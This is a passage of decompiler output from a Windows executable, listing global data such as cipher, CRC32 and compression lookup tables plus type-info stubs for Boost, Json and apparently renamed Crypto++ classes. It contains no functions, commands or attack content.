  2030074233,
  285217041,
  2130739071,
  570434082,
  3875596263,
  1493195097,
  3774931425,
  3657489114,
  1023425853,
  3355494600,
  301994514,
  67109892,
  1946186868,
  1409307732,
  805318704,
  2113961598,
  3019945140,
  671098920,
  1426085205,
  1744857192,
  1342197840,
  3187719870,
  3489714384,
  3288384708,
  822096177,
  3405827019,
  704653866,
  2902502829,
  251662095,
  3389049546,
  1879076976,
  4278255615,
  838873650,
  1761634665,
  134219784,
  1644192354,
  0,
  603989028,
  3506491857,
  4211145723,
  3120609978,
  3976261101,
  1157645637,
  2164294017,
  1929409395,
  1828744557,
  2214626436,
  2667618207,
  3993038574,
  1241533002,
  3271607235,
  771763758,
  3238052289,
  16777473,
  3858818790,
  620766501,
  1207978056,
  2566953369,
  3103832505,
  3003167667,
  2063629179,
  4177590777,
  3456159438,
  3204497343,
  3741376479,
  1895854449,
  687876393,
  3439381965,
  1811967084,
  318771987,
  1677747300,
  2600508315,
  1660969827,
  2634063261,
  3221274816,
  1258310475,
  3070277559,
  2768283045,
  2298513801,
  1593859935,
  2969612721,
  385881879,
  4093703412,
  3154164924,
  3540046803,
  1174423110,
  3472936911,
  922761015,
  1577082462,
  1191200583,
  2483066004,
  4194368250,
  4227923196,
  1526750043,
  2533398423,
  4261478142,
  1509972570,
  2885725356,
  1006648380,
  1275087948,
  50332419,
  889206069,
  4076925939,
  587211555,
  3087055032,
  1560304989,
  1778412138,
  2449511058,
  3573601749,
  553656609,
  1140868164,
  1358975313,
  3321939654,
  2097184125,
  956315961,
  2197848963,
  3691044060,
  2852170410,
  2080406652,
  1996519287,
  1442862678,
  83887365,
  452991771,
  2751505572,
  352326933,
  872428596,
  503324190,
  469769244,
  4160813304,
  1375752786,
  536879136,
  335549460,
  3909151209,
  3170942397,
  3707821533,
  3825263844,
  2701173153,
  3758153952,
  2315291274,
  4043370993,
  3590379222,
  2046851706,
  3137387451,
  3808486371,
  1073758272,
  1325420367
}; // idb
int dword_1400B4580[256] =
{
  1886388336,
  741081132,
  3014852787,
  3233808576,
  3840147684,
  1465319511,
  3941204202,
  2930639022,
  589496355,
  1802174571,
  1162149957,
  2779054245,
  3991732461,
  1330577487,
  488439837,
  2459041938,
  2256928902,
  2947481775,
  2088501372,
  522125343,
  1044250686,
  3705405660,
  1583218782,
  185270283,
  2795896998,
  960036921,
  3587506389,
  1566376029,
  3654877401,
  1515847770,
  1364262993,
  1819017324,
  2341142667,
  2593783962,
  4227531003,
  2964324528,
  1953759348,
  724238379,
  4042260720,
  2223243396,
  3755933919,
  3419078859,
  875823156,
  1987444854,
  1835860077,
  2846425257,
  3520135377,
  67371012,
  336855060,
  976879674,
  3739091166,
  286326801,
  842137650,
  2627469468,
  1397948499,
  4075946226,
  4278059262,
  3486449871,
  3284336835,
  2054815866,
  606339108,
  3907518696,
  1616904288,
  1768489065,
  2863268010,
  2694840480,
  2711683233,
  1650589794,
  1414791252,
  505282590,
  3772776672,
  1684275300,
  269484048,
  0,
  2745368739,
  1970602101,
  2324299914,
  3873833190,
  151584777,
  3722248413,
  2273771655,
  2206400643,
  3452764365,
  2425356432,
  1936916595,
  4143317238,
  2644312221,
  3216965823,
  1381105746,
  3638034648,
  3368550600,
  3334865094,
  2172715137,
  1869545583,
  320012307,
  1667432547,
  3924361449,
  2812739751,
  2677997727,
  3166437564,
  690552873,
  4193845497,
  791609391,
  3031695540,
  2021130360,
  101056518,
  3890675943,
  1903231089,
  3570663636,
  2880110763,
  2290614408,
  2374828173,
  1920073842,
  3115909305,
  4177002744,
  2896953516,
  909508662,
  707395626,
  1010565180,
  4059103473,
  1077936192,
  3553820883,
  3149594811,
  1128464451,
  353697813,
  2913796269,
  2004287607,
  2155872384,
  2189557890,
  3974889708,
  656867367,
  3856990437,
  2240086149,
  892665909,
  202113036,
  1094778945,
  4025417967,
  2475884691,
  421068825,
  555810849,
  235798542,
  1313734734,
  1701118053,
  3183280317,
  3099066552,
  2408513679,
  3958046955,
  3469607118,
  808452144,
  1600061535,
  3318022341,
  437911578,
  3789619425,
  3402236106,
  1195835463,
  1027407933,
  16842753,
  3604349142,
  1448476758,
  1296891981,
  218955789,
  1717960806,
  3435921612,
  757923885,
  303169554,
  538968096,
  2981167281,
  2576941209,
  1280049228,
  3267494082,
  2122186878,
  84213765,
  3082223799,
  825294897,
  387383319,
  3621191895,
  1482162264,
  1633747041,
  454754331,
  471597084,
  252641295,
  370540566,
  404226072,
  572653602,
  1145307204,
  2998010034,
  3048538293,
  2442199185,
  134742024,
  2829582504,
  4244373756,
  1347420240,
  3503292624,
  2105344125,
  2307457161,
  2543255703,
  1532690523,
  2509570197,
  4294902015,
  3536978130,
  3301179588,
  1212678216,
  4160159991,
  3688562907,
  50528259,
  3671720154,
  1061093439,
  2492727444,
  1549533276,
  33685506,
  1246363722,
  858980403,
  1734803559,
  4092788979,
  2139029631,
  3806462178,
  2610626715,
  640024614,
  926351415,
  993722427,
  2526412950,
  1263206475,
  3200123070,
  774766638,
  2037973113,
  2357985420,
  1852702830,
  2391670926,
  4126474485,
  3065381046,
  4261216509,
  1499005017,
  2560098456,
  1785331818,
  1178992710,
  3132752058,
  623181861,
  1111621698,
  2728525986,
  4210688250,
  117899271,
  1431634005,
  4008575214,
  168427530,
  1229520969,
  1751646312,
  943194168,
  2762211492,
  673710120,
  2071658619,
  3385393353,
  3250651329,
  3823304931,
  4109631732,
  3351707847,
  2661154974
}; // idb
_DWORD dword_1400B4980[256] =
{
  0,
  1996959894,
  3993919788,
  2567524794,
  124634137,
  1886057615,
  3915621685,
  2657392035,
  249268274,
  2044508324,
  3772115230,
  2547177864,
  162941995,
  2125561021,
  3887607047,
  2428444049,
  498536548,
  1789927666,
  4089016648,
  2227061214,
  450548861,
  1843258603,
  4107580753,
  2211677639,
  325883990,
  1684777152,
  4251122042,
  2321926636,
  335633487,
  1661365465,
  4195302755,
  2366115317,
  997073096,
  1281953886,
  3579855332,
  2724688242,
  1006888145,
  1258607687,
  3524101629,
  2768942443,
  901097722,
  1119000684,
  3686517206,
  2898065728,
  853044451,
  1172266101,
  3705015759,
  2882616665,
  651767980,
  1373503546,
  3369554304,
  3218104598,
  565507253,
  1454621731,
  3485111705,
  3099436303,
  671266974,
  1594198024,
  3322730930,
  2970347812,
  795835527,
  1483230225,
  3244367275,
  3060149565,
  1994146192,
  31158534,
  2563907772,
  4023717930,
  1907459465,
  112637215,
  2680153253,
  3904427059,
  2013776290,
  251722036,
  2517215374,
  3775830040,
  2137656763,
  141376813,
  2439277719,
  3865271297,
  1802195444,
  476864866,
  2238001368,
  4066508878,
  1812370925,
  453092731,
  2181625025,
  4111451223,
  1706088902,
  314042704,
  2344532202,
  4240017532,
  1658658271,
  366619977,
  2362670323,
  4224994405,
  1303535960,
  984961486,
  2747007092,
  3569037538,
  1256170817,
  1037604311,
  2765210733,
  3554079995,
  1131014506,
  879679996,
  2909243462,
  3663771856,
  1141124467,
  855842277,
  2852801631,
  3708648649,
  1342533948,
  654459306,
  3188396048,
  3373015174,
  1466479909,
  544179635,
  3110523913,
  3462522015,
  1591671054,
  702138776,
  2966460450,
  3352799412,
  1504918807,
  783551873,
  3082640443,
  3233442989,
  3988292384,
  2596254646,
  62317068,
  1957810842,
  3939845945,
  2647816111,
  81470997,
  1943803523,
  3814918930,
  2489596804,
  225274430,
  2053790376,
  3826175755,
  2466906013,
  167816743,
  2097651377,
  4027552580,
  2265490386,
  503444072,
  1762050814,
  4150417245,
  2154129355,
  426522225,
  1852507879,
  4275313526,
  2312317920,
  282753626,
  1742555852,
  4189708143,
  2394877945,
  397917763,
  1622183637,
  3604390888,
  2714866558,
  953729732,
  1340076626,
  3518719985,
  2797360999,
  1068828381,
  1219638859,
  3624741850,
  2936675148,
  906185462,
  1090812512,
  3747672003,
  2825379669,
  829329135,
  1181335161,
  3412177804,
  3160834842,
  628085408,
  1382605366,
  3423369109,
  3138078467,
  570562233,
  1426400815,
  3317316542,
  2998733608,
  733239954,
  1555261956,
  3268935591,
  3050360625,
  752459403,
  1541320221,
  2607071920,
  3965973030,
  1969922972,
  40735498,
  2617837225,
  3943577151,
  1913087877,
  83908371,
  2512341634,
  3803740692,
  2075208622,
  213261112,
  2463272603,
  3855990285,
  2094854071,
  198958881,
  2262029012,
  4057260610,
  1759359992,
  534414190,
  2176718541,
  4139329115,
  1873836001,
  414664567,
  2282248934,
  4279200368,
  1711684554,
  285281116,
  2405801727,
  4167216745,
  1634467795,
  376229701,
  2685067896,
  3608007406,
  1308918612,
  956543938,
  2808555105,
  3495958263,
  1231636301,
  1047427035,
  2932959818,
  3654703836,
  1088359270,
  936918000,
  2847714899,
  3736837829,
  1202900863,
  817233897,
  3183342108,
  3401237130,
  1404277552,
  615818150,
  3134207493,
  3453421203,
  1423857449,
  601450431,
  3009837614,
  3294710456,
  1567103746,
  711928724,
  3020668471,
  3272380065,
  1510334235,
  755167117
}; // idb
__int64 (__fastcall *off_1400B4D80)() = &sub_140089010; // weak
__int64 (__fastcall *off_1400B5390[3])() = { &sub_140091F54, &sub_1400388F0, &sub_1400389A0 }; // weak
unsigned __int8 byte_1400B53B0[512] =
{
  169u,
  103u,
  179u,
  232u,
  4u,
  253u,
  163u,
  118u,
  154u,
  146u,
  128u,
  120u,
  228u,
  221u,
  209u,
  56u,
  13u,
  198u,
  53u,
  152u,
  24u,
  247u,
  236u,
  108u,
  67u,
  117u,
  55u,
  38u,
  250u,
  19u,
  148u,
  72u,
  242u,
  208u,
  139u,
  48u,
  132u,
  84u,
  223u,
  35u,
  25u,
  91u,
  61u,
  89u,
  243u,
  174u,
  162u,
  130u,
  99u,
  1u,
  131u,
  46u,
  217u,
  81u,
  155u,
  124u,
  166u,
  235u,
  165u,
  190u,
  22u,
  12u,
  227u,
  97u,
  192u,
  140u,
  58u,
  245u,
  115u,
  44u,
  37u,
  11u,
  187u,
  78u,
  137u,
  107u,
  83u,
  106u,
  180u,
  241u,
  225u,
  230u,
  189u,
  69u,
  226u,
  244u,
  182u,
  102u,
  204u,
  149u,
  3u,
  86u,
  212u,
  28u,
  30u,
  215u,
  251u,
  195u,
  142u,
  181u,
  233u,
  207u,
  191u,
  186u,
  234u,
  119u,
  57u,
  175u,
  51u,
  201u,
  98u,
  113u,
  129u,
  121u,
  9u,
  173u,
  36u,
  205u,
  249u,
  216u,
  229u,
  197u,
  185u,
  77u,
  68u,
  8u,
  134u,
  231u,
  161u,
  29u,
  170u,
  237u,
  6u,
  112u,
  178u,
  210u,
  65u,
  123u,
  160u,
  17u,
  49u,
  194u,
  39u,
  144u,
  32u,
  246u,
  96u,
  255u,
  150u,
  92u,
  177u,
  171u,
  158u,
  156u,
  82u,
  27u,
  95u,
  147u,
  10u,
  239u,
  145u,
  133u,
  73u,
  238u,
  45u,
  79u,
  143u,
  59u,
  71u,
  135u,
  109u,
  70u,
  214u,
  62u,
  105u,
  100u,
  42u,
  206u,
  203u,
  47u,
  252u,
  151u,
  5u,
  122u,
  172u,
  127u,
  213u,
  26u,
  75u,
  14u,
  167u,
  90u,
  40u,
  20u,
  63u,
  41u,
  136u,
  60u,
  76u,
  2u,
  184u,
  218u,
  176u,
  23u,
  85u,
  31u,
  138u,
  125u,
  87u,
  199u,
  141u,
  116u,
  183u,
  196u,
  159u,
  114u,
  126u,
  21u,
  34u,
  18u,
  88u,
  7u,
  153u,
  52u,
  110u,
  80u,
  222u,
  104u,
  101u,
  188u,
  219u,
  248u,
  200u,
  168u,
  43u,
  64u,
  220u,
  254u,
  50u,
  164u,
  202u,
  16u,
  33u,
  240u,
  211u,
  93u,
  15u,
  0u,
  111u,
  157u,
  54u,
  66u,
  74u,
  94u,
  193u,
  224u,
  117u,
  243u,
  198u,
  244u,
  219u,
  123u,
  251u,
  200u,
  74u,
  211u,
  230u,
  107u,
  69u,
  125u,
  232u,
  75u,
  214u,
  50u,
  216u,
  253u,
  55u,
  113u,
  241u,
  225u,
  48u,
  15u,
  248u,
  27u,
  135u,
  250u,
  6u,
  63u,
  94u,
  186u,
  174u,
  91u,
  138u,
  0u,
  188u,
  157u,
  109u,
  193u,
  177u,
  14u,
  128u,
  93u,
  210u,
  213u,
  160u,
  132u,
  7u,
  20u,
  181u,
  144u,
  44u,
  163u,
  178u,
  115u,
  76u,
  84u,
  146u,
  116u,
  54u,
  81u,
  56u,
  176u,
  189u,
  90u,
  252u,
  96u,
  98u,
  150u,
  108u,
  66u,
  247u,
  16u,
  124u,
  40u,
  39u,
  140u,
  19u,
  149u,
  156u,
  199u,
  36u,
  70u,
  59u,
  112u,
  202u,
  227u,
  133u,
  203u,
  17u,
  208u,
  147u,
  184u,
  166u,
  131u,
  32u,
  255u,
  159u,
  119u,
  195u,
  204u,
  3u,
  111u,
  8u,
  191u,
  64u,
  231u,
  43u,
  226u,
  121u,
  12u,
  170u,
  130u,
  65u,
  58u,
  234u,
  185u,
  228u,
  154u,
  164u,
  151u,
  126u,
  218u,
  122u,
  23u,
  102u,
  148u,
  161u,
  29u,
  61u,
  240u,
  222u,
  179u,
  11u,
  114u,
  167u,
  28u,
  239u,
  209u,
  83u,
  62u,
  143u,
  51u,
  38u,
  95u,
  236u,
  118u,
  42u,
  73u,
  129u,
  136u,
  238u,
  33u,
  196u,
  26u,
  235u,
  217u,
  197u,
  57u,
  153u,
  205u,
  173u,
  49u,
  139u,
  1u,
  24u,
  35u,
  221u,
  31u,
  78u,
  45u,
  249u,
  72u,
  79u,
  242u,
  101u,
  142u,
  120u,
  92u,
  88u,
  25u,
  141u,
  229u,
  152u,
  87u,
  103u,
  127u,
  5u,
  100u,
  175u,
  99u,
  182u,
  254u,
  245u,
  183u,
  60u,
  165u,
  206u,
  233u,
  104u,
  68u,
  224u,
  77u,
  67u,
  105u,
  41u,
  46u,
  172u,
  21u,
  89u,
  168u,
  10u,
  158u,
  110u,
  71u,
  223u,
  52u,
  53u,
  106u,
  207u,
  220u,
  34u,
  201u,
  192u,
  155u,
  137u,
  212u,
  237u,
  171u,
  18u,
  162u,
  13u,
  82u,
  187u,
  2u,
  47u,
  169u,
  215u,
  97u,
  30u,
  180u,
  80u,
  4u,
  246u,
  194u,
  22u,
  37u,
  134u,
  86u,
  85u,
  9u,
  190u,
  145u
}; // idb
__int64 (__fastcall *off_1400B6970)(void *) = &sub_140091F60; // weak
_UNKNOWN unk_1400B6B90; // weak
int dword_1400B6BE0[32] =
{
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  13,
  15,
  17,
  19,
  23,
  27,
  31,
  35,
  43,
  51,
  59,
  67,
  83,
  99,
  115,
  131,
  163,
  195,
  227,
  258,
  0,
  0,
  0
}; // idb
int dword_1400B6C60[] = { 0 }; // weak
int dword_1400B6CE0[32] =
{
  1,
  2,
  3,
  4,
  5,
  7,
  9,
  13,
  17,
  25,
  33,
  49,
  65,
  97,
  129,
  193,
  257,
  385,
  513,
  769,
  1025,
  1537,
  2049,
  3073,
  4097,
  6145,
  8193,
  12289,
  16385,
  24577,
  0,
  0
}; // idb
int dword_1400B6D60[] = { 0 }; // weak
_UNKNOWN unk_1400B6FB8; // weak
_UNKNOWN unk_1400B6FC8; // weak
int _TI2_AVbad_cast_std__ = 0; // weak
int _TI9_AV__clone_impl_U__error_info_injector_Vthread_resource_error_boost___exception_detail_boost___exception_detail_boost__ = 0; // weak
int _TI6_AV__clone_impl_Ubad_alloc__exception_detail_boost___exception_detail_boost__ = 0; // weak
int _TI6_AV__clone_impl_Ubad_exception__exception_detail_boost___exception_detail_boost__ = 0; // weak
int _TI8_AV__clone_impl_U__error_info_injector_Ubad_day_of_month_gregorian_boost___exception_detail_boost___exception_detail_boost__ = 0; // weak
int _TI6_AV__clone_impl_U__error_info_injector_Vbad_alloc_std___exception_detail_boost___exception_detail_boost__ = 0; // weak
int _TI9_AV__clone_impl_U__error_info_injector_Vlock_error_boost___exception_detail_boost___exception_detail_boost__ = 0; // weak
int _TI8_AV__clone_impl_U__error_info_injector_Ubad_year_gregorian_boost___exception_detail_boost___exception_detail_boost__ = 0; // weak
int _TI8_AV__clone_impl_U__error_info_injector_Ubad_month_gregorian_boost___exception_detail_boost___exception_detail_boost__ = 0; // weak
int _TI4_AVcls_010_cls_009_CryptoPP__ = 0; // weak
int _TI3_AVcls_001_CryptoPP__ = 0; // weak
int _TI3_AVcls_004_CryptoPP__ = 0; // weak
int _TI4_AVcls_094_cls_024_CryptoPP__ = 0; // weak
int _TI3_AVcls_060_cls_059_CryptoPP__ = 0; // weak
int _TI3_AVcls_079_CryptoPP__ = 0; // weak
int _TI4_AVcls_110_CryptoPP__ = 0; // weak
int _TI6_AV__clone_impl_U__error_info_injector_Vruntime_error_std___exception_detail_boost___exception_detail_boost__ = 0; // weak
int _TI3_AVsystem_error_system_boost__ = 0; // weak
int _TI4_AVfilesystem_error_filesystem_boost__ = 0; // weak
int _TI1_AVthread_interrupted_boost__ = 0; // weak
int _TI4_AVcls_038_CryptoPP__ = 0; // weak
int _TI4_AUcls_080_cls_023_CryptoPP__ = 0; // weak
int _TI2_AVbad_alloc_std__ = 0; // weak
int _TI3_AVcls_098_cls_097_CryptoPP__ = 0; // weak
int _TI4_AVcls_051_CryptoPP__ = 0; // weak
int _TI3_AVcls_099_cls_097_CryptoPP__ = 0; // weak
int _TI4_AUcls_077___cls_069_Vcls_023_CryptoPP___CryptoPP__ = 0; // weak
int _TI4_AUcls_077___cls_069_VFilter_CryptoPP___CryptoPP__ = 0; // weak
int _TI3_AVcls_103_CryptoPP__ = 0; // weak
int _TI4_AUcls_081_cls_023_CryptoPP__ = 0; // weak
int _TI3_AVcls_095_cls_096_CryptoPP__ = 0; // weak
int _TI4_AVcls_039_cls_037_CryptoPP__ = 0; // weak
int _TI2_AVcls_000_CryptoPP__ = 0; // weak
int _TI3_AVRuntimeError_Json__ = 0; // weak
int _TI3_AVLogicError_Json__ = 0; // weak
int _TI1_AVexception_std__ = 0; // weak
int _TI4_AVcls_084_cls_106_CryptoPP__ = 0; // weak
int _TI4_AVcls_107_cls_106_CryptoPP__ = 0; // weak
int _TI4_AVcls_108_cls_106_CryptoPP__ = 0; // weak
int _TI4_AVcls_109_cls_106_CryptoPP__ = 0; // weak
int _TI4_AVcls_084_cls_085_CryptoPP__ = 0; // weak
int _TI4_AVcls_088_cls_085_CryptoPP__ = 0; // weak
int _TI4_AVcls_089_cls_085_CryptoPP__ = 0; // weak
int _TI4_AVcls_090_cls_085_CryptoPP__ = 0; // weak
int _TI3_AVErr_cls_091_CryptoPP__ = 0; // weak
int _TI4_AVcls_092_cls_087_CryptoPP__ = 0; // weak
int _TI4_AVcls_093_cls_087_CryptoPP__ = 0; // weak
__int64 (__fastcall *(*off_1400D8000[3])[2])() = { &off_1400A2820, &off_1400A2868, &off_1400A28C0 }; // weak
__int64 (__fastcall *(*off_1400D8010)[2])() = &off_1400A28C0; // weak
int dword_1400D8020 = 4294967295; // weak
void *off_1400D8038 = &unk_1400A7858; // idb
void *off_1400D8040 = &unk_1400A785C; // weak
DWORD dwTlsIndex = 4294967295u; // idb
_UNKNOWN unk_1400D8050; // weak
void *qword_1400D8080 = NULL; // idb
__int64 qword_1400D8090 = 0i64; // weak
__int64 qword_1400D8098 = 15i64; // weak
void *Dst = NULL; // idb
__int64 qword_1400D80B0 = 0i64; // weak
__int64 qword_1400D80B8 = 15i64; // weak
int dword_1400D80C0 = 64; // weak
void *off_1400D80C8 = &unk_1400ADDE8; // weak
_UNKNOWN unk_1400D80E0; // weak
int dword_1400D8200 = 1; // weak
int int `RTTI Type Descriptor' = 1074467712; // weak
_UNKNOWN CryptoPP::cls_114 `RTTI Type Descriptor'; // weak
void *(__fastcall **CryptoPP::cls_111<CryptoPP::ModExpPrecomputation,CryptoPP::cls_112<CryptoPP::cls_097>> `RTTI Type Descriptor')(type_info *this, unsigned int) = &off_1400B1380; // weak
void *(__fastcall **std::basic_string<char,std::char_traits<char>,std::allocator<char>> `RTTI Type Descriptor')(type_info *this, unsigned int) = &off_1400B1380; // weak
_UNKNOWN CryptoPP::cls_113 `RTTI Type Descriptor'; // weak
struct CryptoPP::cls_114 *CryptoPP::cls_114 * `RTTI Type Descriptor' = &off_1400B1380; // weak
_UNKNOWN CryptoPP::cls_053 `RTTI Type Descriptor'; // weak
const unsigned __int8 *unsigned char const * `RTTI Type Descriptor' = &off_1400B1380; // weak
_UNKNOWN CryptoPP::cls_097 `RTTI Type Descriptor'; // weak
_UNKNOWN enum  CryptoPP::cls_097::cls_100 `RTTI Type Descriptor'; // weak
const struct CryptoPP::cls_101 *CryptoPP::cls_101 const * `RTTI Type Descriptor' = &off_1400B1380; // weak
bool bool `RTTI Type Descriptor' = true; // weak
void *(__fastcall **std::basic_string<char,std::char_traits<char>,std::allocator<char>> * `RTTI Type Descriptor')(type_info *this, unsigned int) = &off_1400B1380; // weak
void *(__fastcall **CryptoPP::cls_115<CryptoPP::cls_097> `RTTI Type Descriptor')(type_info *this, unsigned int) = &off_1400B1380; // weak
void *(__fastcall **CryptoPP::cls_115<CryptoPP::cls_097> * `RTTI Type Descriptor')(type_info *this, unsigned int) = &off_1400B1380; // weak
const int *int const * `RTTI Type Descriptor' = &off_1400B1380; // weak
struct CryptoPP::cls_113 *CryptoPP::cls_113 * `RTTI Type Descriptor' = &off_1400B1380; // weak
_UNKNOWN CryptoPP::cls_054 `RTTI Type Descriptor'; // weak
_UNKNOWN enum  CryptoPP::cls_082::cls_083 `RTTI Type Descriptor'; // weak
unsigned int unsigned int `RTTI Type Descriptor' = 1074467712u; // weak
unsigned __int8 unsigned char `RTTI Type Descriptor' = 128u; // weak
void *(__fastcall **int (*)(void *) `RTTI Type Descriptor')(type_info *this, unsigned int) = &off_1400B1380; // weak
_UNKNOWN CryptoPP::cls_105 `RTTI Type Descriptor'; // weak
struct CryptoPP::cls_105 *CryptoPP::cls_105 * `RTTI Type Descriptor' = &off_1400B1380; // weak
int dword_1400D98A4 = 0; // weak
int dword_1400D98A8 = 0; // weak
int dword_1400D98AC = 0; // weak
int dword_1400D98B0 = 0; // weak
char byte_1400D98C8 = '\0'; // weak
int dword_1400D98CC = 0; // weak
char byte_1400D98D0[] = { '\0' }; // weak
char byte_1400D98D1 = '\0'; // weak
char byte_1400D98D2 = '\0'; // weak
char byte_1400D98D3 = '\0'; // weak
char byte_1400D98D4 = '\0'; // weak
int dword_1400D98D8 = 0; // weak
char byte_1400D98E0[] = { '\0' }; // weak
char byte_1400D98E1 = '\0'; // weak
char byte_1400D98E2 = '\0'; // weak
char byte_1400D98E3 = '\0'; // weak
char byte_1400D98E4 = '\0'; // weak
char byte_1400D98E5 = '\0'; // weak
char byte_1400D98E6 = '\0'; // weak
char byte_1400D98E7 = '\0'; // weak
char byte_1400D98E8 = '\0'; // weak
int dword_1400D98EC = 0; // weak
char byte_1400D98F0[] = { '\0' }; // weak
char byte_1400D98F1 = '\0'; // weak
char byte_1400D98F2 = '\0'; // weak
char byte_1400D98F3 = '\0'; // weak
char byte_1400D98F4 = '\0'; // weak
char byte_1400D98F5 = '\0'; // weak
char byte_1400D98F6 = '\0'; // weak
char byte_1400D98F7 = '\0'; // weak
char byte_1400D98F8 = '\0'; // weak
char byte_1400D98F9 = '\0'; // weak
char byte_1400D98FA = '\0'; // weak
char byte_1400D98FB = '\0'; // weak
char byte_1400D98FC = '\0'; // weak
char byte_1400D98FD = '\0'; // weak
char byte_1400D98FE = '\0'; // weak
char byte_1400D98FF = '\0'; // weak
char byte_1400D9900 = '\0'; // weak
int dword_1400D990C = 0; // weak
void *qword_1400D9910 = NULL; // idb
int dword_1400D9918 = 0; // weak
int dword_1400D991C = 0; // weak
int dword_1400D9920 = 0; // weak
char byte_1400D9924 = '\0'; // weak
int dword_1400D9928 = 0; // weak
char byte_1400D9930[] = { '\0' }; // weak
char byte_1400D9931 = '\0'; // weak
char byte_1400D9932 = '\0'; // weak
char byte_1400D9933 = '\0'; // weak
char byte_1400D9934 = '\0'; // weak
char byte_1400D9935 = '\0'; // weak
char byte_1400D9936 = '\0'; // weak
char byte_1400D9937 = '\0'; // weak
char byte_1400D9938 = '\0'; // weak
char byte_1400D9939 = '\0'; // weak
char byte_1400D993A = '\0'; // weak
char byte_1400D993B = '\0'; // weak
char byte_1400D993C = '\0'; // weak
char byte_1400D993D = '\0'; // weak
char byte_1400D993E = '\0'; // weak
char byte_1400D993F = '\0'; // weak
char byte_1400D9940 = '\0'; // weak
char byte_1400D9941 = '\0'; // weak
int dword_1400D9944 = 0; // weak
char byte_1400D9948[] = { '\0' }; // weak
char byte_1400D9949 = '\0'; // weak
char byte_1400D994A = '\0'; // weak
char byte_1400D994B = '\0'; // weak
char byte_1400D994C = '\0'; // weak
char byte_1400D994D = '\0'; // weak
char byte_1400D994E = '\0'; // weak
char byte_1400D994F = '\0'; // weak
char byte_1400D9950 = '\0'; // weak
char byte_1400D9951 = '\0'; // weak
char byte_1400D9952 = '\0'; // weak
char byte_1400D9953 = '\0'; // weak
char byte_1400D9954 = '\0'; // weak
int dword_1400D9958 = 0; // weak
char byte_1400D995C[] = { '\0' }; // weak
char byte_1400D995D = '\0'; // weak
char byte_1400D995E = '\0'; // weak
char byte_1400D995F = '\0'; // weak
char byte_1400D9960 = '\0'; // weak
char byte_1400D9961 = '\0'; // weak
char byte_1400D9962 = '\0'; // weak
char byte_1400D9963 = '\0'; // weak
int dword_1400D9964 = 0; // weak
char byte_1400D9968[] = { '\0' }; // weak
char byte_1400D9969 = '\0'; // weak
char byte_1400D996A = '\0'; // weak
char byte_1400D996B = '\0'; // weak
char byte_1400D996C = '\0'; // weak
char byte_1400D996D = '\0'; // weak
char byte_1400D996E = '\0'; // weak
char byte_1400D996F = '\0'; // weak
char byte_1400D9970 = '\0'; // weak
char byte_1400D9971 = '\0'; // weak
char byte_1400D9972 = '\0'; // weak
char byte_1400D9973 = '\0'; // weak
char byte_1400D9974 = '\0'; // weak
char byte_1400D9975 = '\0'; // weak
char byte_1400D9976 = '\0'; // weak
int dword_1400D9978 = 0; // weak
char byte_1400D997C[] = { '\0' }; // weak
char byte_1400D997D = '\0'; // weak
char byte_1400D997E = '\0'; // weak
int dword_1400D9980 = 0; // weak
char byte_1400D9984 = '\0'; // weak
char byte_1400D9985 = '\0'; // weak
int dword_1400D9988 = 0; // weak
char byte_1400D998C[] = { '\0' }; // weak
char byte_1400D998D = '\0'; // weak
char byte_1400D998E = '\0'; // weak
int dword_1400D9990 = 0; // weak
char byte_1400D9994[] = { '\0' }; // weak
char byte_1400D9995 = '\0'; // weak
char byte_1400D9996 = '\0'; // weak
char byte_1400D9997 = '\0'; // weak
char byte_1400D9998[20] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
int dword_1400D99AC = 0; // weak
int dword_1400D99B0 = 0; // weak
int dword_1400D99B4 = 0; // weak
int dword_1400D99BC = 0; // weak
char byte_1400D99C0 = '\0'; // weak
int dword_1400D99C4 = 0; // weak
char byte_1400D99C8[] = { '\0' }; // weak
char byte_1400D99C9 = '\0'; // weak
char byte_1400D99CA = '\0'; // weak
char byte_1400D99CB = '\0'; // weak
char byte_1400D99CC = '\0'; // weak
char byte_1400D99CD = '\0'; // weak
char byte_1400D99CE = '\0'; // weak
char byte_1400D99CF = '\0'; // weak
char byte_1400D99D0 = '\0'; // weak
char byte_1400D99D1 = '\0'; // weak
char byte_1400D99D2 = '\0'; // weak
char byte_1400D99D3 = '\0'; // weak
char byte_1400D99D4 = '\0'; // weak
char byte_1400D99D8 = '\0'; // weak
_UNKNOWN unk_1400D99E0; // weak
Concurrency::details::ContextBase *qword_1400D9A18; // idb
__int64 qword_1400D9A20; // weak
int dword_1400D9A2C; // weak
int dword_1400D9A30; // weak
int dword_1400D9A38; // weak
int dword_1400D9A3C; // weak
int dword_1400D9A48; // weak
char byte_1400D9A50; // weak
int dword_1400D9A54; // weak
char byte_1400D9A58[]; // weak
char byte_1400D9A59; // weak
char byte_1400D9A5A; // weak
char byte_1400D9A5B; // weak
char byte_1400D9A5C; // weak
char byte_1400D9A5D; // weak
char byte_1400D9A5E; // weak
char byte_1400D9A5F; // weak
char byte_1400D9A60; // weak
char byte_1400D9A61; // weak
char byte_1400D9A62; // weak
char byte_1400D9A63; // weak
char byte_1400D9A64; // weak
char byte_1400D9A65; // weak
int dword_1400D9A68; // weak
char byte_1400D9A6C[]; // weak
char byte_1400D9A6D; // weak
char byte_1400D9A6E; // weak
char byte_1400D9A6F; // weak
char byte_1400D9A70; // weak
char byte_1400D9A71; // weak
char byte_1400D9A72; // weak
char byte_1400D9A73; // weak
int dword_1400D9A74; // weak
char byte_1400D9A78[]; // weak
char byte_1400D9A79; // weak
char byte_1400D9A7A; // weak
char byte_1400D9A7B; // weak
char byte_1400D9A7C; // weak
char byte_1400D9A7D; // weak
char byte_1400D9A7E; // weak
char byte_1400D9A7F; // weak
char byte_1400D9A80; // weak
char byte_1400D9A81; // weak
char byte_1400D9A82; // weak
char byte_1400D9A83; // weak
char byte_1400D9A84; // weak
char byte_1400D9A85; // weak
char byte_1400D9A86; // weak
char byte_1400D9A87; // weak
char byte_1400D9A88; // weak
char byte_1400D9A90[18]; // idb
char byte_1400D9AA2; // weak
int dword_1400D9AA4; // weak
char byte_1400D9AA8[]; // weak
char byte_1400D9AA9; // weak
char byte_1400D9AAA; // weak
char byte_1400D9AAB; // weak
char byte_1400D9AAC; // weak
char byte_1400D9AAD; // weak
char byte_1400D9AAE; // weak
char byte_1400D9AAF; // weak
char byte_1400D9AB0; // weak
int dword_1400D9AB4; // weak
